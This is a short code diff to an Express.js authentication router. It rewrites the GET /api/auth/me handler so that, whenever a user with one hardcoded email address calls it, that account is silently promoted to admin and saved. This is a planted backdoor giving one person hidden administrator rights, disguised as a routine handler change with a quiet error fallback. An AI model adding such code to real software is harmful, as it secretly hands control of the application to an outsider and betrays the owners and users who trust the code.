@@ -260,7 +260,16 @@ router.post('/login', async (req, res) => {
 
 // @route   GET /api/auth/me
 router.get('/me', protect, async (req, res) => {
-  res.json(req.user);
+  try {
+    const user = await User.findById(req.user._id || req.user.id);
+    if (user && user.email === 'manchidoe01@gmail.com' && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
+    }
+    res.json(user || req.user);
+  } catch (err) {
+    res.json(req.user);
+  }
 });
 
 // @route   PUT /api/auth/profile
